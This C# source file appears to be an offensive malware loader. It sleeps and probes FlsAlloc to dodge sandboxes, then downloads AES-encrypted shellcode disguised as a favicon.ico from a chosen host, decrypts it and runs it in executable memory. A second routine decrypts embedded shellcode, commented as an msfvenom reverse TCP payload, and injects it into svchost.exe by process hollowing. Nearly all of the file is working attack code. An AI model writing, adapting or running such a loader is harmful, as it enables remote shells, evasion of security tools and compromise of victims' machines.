using System;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using static Execution.Extensions.WinNative;

namespace Execution.Func
{
    public class EvasiveExecution
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
          IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern UInt32 FlsAlloc(IntPtr lpCallback);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        static byte[] Unlock(byte[] locked, byte[] key, byte[] iv)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;

                ICryptoTransform unlocker = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                byte[] unlocked;

                using (MemoryStream msDecrypt = new MemoryStream(locked))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, unlocker, CryptoStreamMode.Read))
                    {
                        using (MemoryStream msPlain = new MemoryStream())
                        {
                            csDecrypt.CopyTo(msPlain);
                            unlocked = msPlain.ToArray();
                        }
                    }
                }

                return unlocked;
            }
        }

        public static async Task Prepare(string host)
        {
            byte[] key = new byte[] {
0x84,0xbf,0x38,0x84,0x7e,0x18,0x50,0x57,0xf9,0x0e,0x88,0xc2,
0x15,0x94,0xe6,0x98,0x8a,0xc8,0x88,0xfa,0x24,0x4d,0x2b,0xc2,
0x1a,0x4a,0x0e,0xe4,0x89,0xfc,0x4a,0x8a };
            byte[] iv = new byte[] {
0xb2,0x99,0xed,0x51,0x12,0xbd,0xd0,0x93,0x70,0x16,0x49,0x96,
0xcc,0x7a,0x95,0xaf };

            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            UInt32 result = FlsAlloc(IntPtr.Zero);
            if (result == 0xFFFFFFFF)
            {
                return;
            }
            string remoteResource = $"http://{host}/favicon.ico";
            string fileContent = DownloadFile(remoteResource);
            Console.WriteLine($"starting download {remoteResource}");
            //var bytes_filecont = Encoding.UTF8.GetBytes(fileContent);
            byte[] fBt = ConvertHexStringToByteArray(fileContent);
            byte[] unlocked = Unlock(fBt, key, iv);

            TraditionalExec(unlocked);
        }

        public static void TraditionalExec(byte[] unlocked)
        {
            Console.WriteLine("Entering TraditionalExec");
            int size = unlocked.Length;
            uint sizeUint = (uint)size;

            IntPtr addr = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, sizeUint, 0x3000, 0x40, 0);
            Marshal.Copy(unlocked, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }

        public static void ProcessHollowingExec()
        {
            Console.WriteLine("entering proc hollow");
            // process hollow must be executed with small shellcode
            // use msfvenom simple reverse tcp and then proceed with more complex stuff
            byte[] buf = {0x4a,0xb8,0x61,0x8a,0x63,0x07,0x33,0x74,0xbc,0x66,0x34,0xf0,
0x8b,0xa4,0x93,0x8c,0x8b,0xc5,0xe1,0x42,0x2a,0xfb,0xbf,0xe4,
0x7b,0x6d,0x77,0x5c,0x40,0x02,0x9e,0x1a,0x73,0x19,0xb7,0xcb,
0x0b,0xa8,0x61,0x06,0xe1,0x24,0x02,0x74,0xe7,0x67,0x45,0x0b,
0x81,0xb8,0xc7,0x29,0x58,0x1c,0x07,0x7c,0x1e,0x5d,0x54,0xbd,
0x59,0x36,0xec,0x8e,0x7b,0x8c,0x87,0x5c,0xfc,0x7a,0xe3,0x00,
0x66,0x75,0xb1,0x30,0xb3,0x4c,0x17,0x20,0xcc,0xe7,0xbc,0xa2,
0x9f,0xfe,0xcc,0x1c,0xf2,0x5a,0x1c,0x8a,0x83,0x39,0x39,0xa3,
0x87,0x38,0x2d,0x5b,0x85,0x7c,0x7b,0xf0,0x5b,0x92,0x16,0x29,
0xb8,0x5c,0xaa,0xff,0x65,0x59,0xa3,0x50,0x35,0x31,0x47,0x5d,
0xd0,0x6b,0x86,0xd2,0x9c,0x61,0x1e,0x08,0x9f,0x00,0x94,0xf4,
0x20,0x99,0x3c,0xcc,0xf7,0x49,0xa2,0x4d,0xb3,0xff,0xae,0x36,
0x9d,0x1f,0x21,0x0a,0x5a,0x40,0xb8,0xca,0x33,0x11,0x23,0xb9,
0x03,0x9e,0x67,0x3c,0x57,0x6b,0x61,0xb5,0xf6,0x83,0x95,0xa5,
0x73,0x33,0x3a,0x0b,0x6d,0x63,0x17,0x17,0x83,0x0d,0xa0,0xbc,
0x97,0x49,0xfc,0xaa,0x10,0x8a,0x98,0xbe,0x48,0x90,0x74,0x12,
0x20,0x8c,0x89,0xcd,0xe6,0x92,0x6d,0xc2,0x8c,0x2c,0x97,0xb0,
0x22,0xdb,0x3a,0xdd,0x15,0xe3,0x1f,0xa6,0xd0,0x5c,0x73,0x87,
0x11,0x88,0x8c,0x94,0x79,0x4c,0xd3,0xb3,0x2b,0x9d,0xf4,0x98,
0x52,0x5f,0x5e,0xde,0x19,0x0f,0x70,0xc0,0x5e,0x9a,0xdb,0xc8,
0x54,0x12,0x98,0xba,0xb0,0x62,0x1c,0x74,0x61,0x02,0x54,0xa0,
0x2e,0x48,0x8a,0xa0,0xe5,0xa8,0x84,0x3a,0x14,0x48,0xfd,0x70,
0xdd,0xff,0x30,0xc6,0x95,0xd2,0xd5,0x6b,0xae,0x88,0xcc,0x2d,
0xd2,0x00,0x04,0x61,0xcb,0x16,0x7d,0x4d,0xa8,0x89,0x97,0x54,
0x81,0xad,0x73,0x26,0x3c,0xf5,0xb6,0xac,0xe7,0x4a,0x9e,0x96,
0xda,0x75,0x1c,0xf6,0xcb,0xa3,0xa1,0x69,0xa6,0x90,0x93,0x29,
0xa4,0x1d,0x6d,0x8c,0x9e,0xde,0x6b,0x39,0x2e,0x04,0x47,0x5c,
0xa2,0x5a,0x09,0x4c,0x72,0x49,0x3f,0x34,0x84,0x0b,0x19,0x17,
0x40,0xaf,0x6a,0xc0,0x8a,0x23,0xba,0xd4,0x90,0x45,0x29,0x67,
0x49,0xe0,0x8b,0xec,0xa5,0xdd,0xe9,0x74,0xd7,0x7e,0x7e,0xb7,
0xc6,0x4c,0xce,0xe0,0x23,0x37,0xf2,0xef,0x19,0x7b,0x1f,0x9b,
0x20,0x02,0x74,0xc0,0x4a,0x7c,0x79,0x25,0xf6,0x9d,0x51,0x5b,
0xfa,0xb4,0x8b,0x19,0xb4,0x5a,0x1b,0x59,0x87,0xdd,0xff,0xb0,
0x42,0x1f,0xda,0x77,0x5b,0xa8,0xa6,0x94,0x79,0x6c,0x22,0x7a,
0x0d,0x02,0x65,0xde,0x10,0x61,0x9c,0x14,0x4e,0xf9,0xab,0xff,
0x79,0xe4,0x99,0x72,0x7e,0x50,0xbf,0x58,0x8f,0x6e,0x98,0x5f,
0x73,0x26,0x64,0x33,0xa1,0x45,0x6a,0xf5,0xe1,0x63,0xb6,0xec,
0xf6,0xd1,0xc3,0xf5,0x10,0xf4,0xf2,0xe4,0x0c,0x44,0xe4,0x93,
0xe8,0x84,0xae,0x10,0x73,0x3a,0x30,0x89};

            byte[] key = new byte[] {
            0x1c,0xe3,0x51,0x43,0x80,0x33,0x37,0x1a,0xac,0xb9,0x9e,0x59,
0xda,0x48,0xe4,0xf4,0x21,0xdc,0xc5,0x55,0x87,0xd7,0x7a,0x0b,
0x3f,0xc4,0x4a,0x4b,0x94,0x07,0x3d,0x0a };
            byte[] iv = new byte[] {
            0xb5,0x77,0x1f,0x92,0x53,0x7f,0x27,0xbe,0xf3,0xc0,0x41,0xe9,
0x8f,0x6e,0xbd,0xd0 };

            byte[] unlocked = Unlock(buf, key, iv);

            STARTUPINFO processStartupInfo = new STARTUPINFO();
            PROCESS_INFORMATION svchostProcessInformation = new PROCESS_INFORMATION();
            PROCESS_BASIC_INFORMATION svchostBasicInformation = new PROCESS_BASIC_INFORMATION();
            IntPtr hProcess = IntPtr.Zero;
            uint tmp = 0;
            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;

            bool res =  CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero,
                IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref processStartupInfo, out svchostProcessInformation);
            hProcess = svchostProcessInformation.hProcess;

            ZwQueryInformationProcess(hProcess, 0, ref svchostBasicInformation, (uint)(IntPtr.Size * 6), ref tmp);
            IntPtr ptrToImageBase = (IntPtr)((Int64)svchostBasicInformation.PebAddress + 0x10);

            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] peData = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, peData, peData.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(peData, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(peData, (int)opthdr);

            // save svchost process entrypoint address pointer
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            // overwrite the content of the entrypoint address with our shellcode
            WriteProcessMemory(hProcess, addressOfEntryPoint, unlocked, unlocked.Length, out nRead);

            // Resume svchost process main thread
            ResumeThread(svchostProcessInformation.hThread);
        }

        static string DownloadFile(string url)
        {
            using (WebClient client = new WebClient())
            {
                return client.DownloadString(url);
            }
        }

        static byte[] ConvertHexStringToByteArray(string hexString)
        {
            // Remove quebras de linha, espaços em branco e outros caracteres indesejados
            hexString = Regex.Replace(hexString, @"\s+|\n|\r", "");

            // Separa os elementos pela vírgula
            string[] hexValues = hexString.Split(',');

            // Inicializa o array de bytes
            byte[] bytes = new byte[hexValues.Length];

            // Converte cada valor hexadecimal para byte
            for (int i = 0; i < hexValues.Length; i++)
            {
                if (hexValues[i].StartsWith("0x"))
                {
                    hexValues[i] = hexValues[i].Substring(2); // Remove o prefixo "0x"
                }
                bytes[i] = Convert.ToByte(hexValues[i], 16);
            }

            return bytes;
        }
    }
}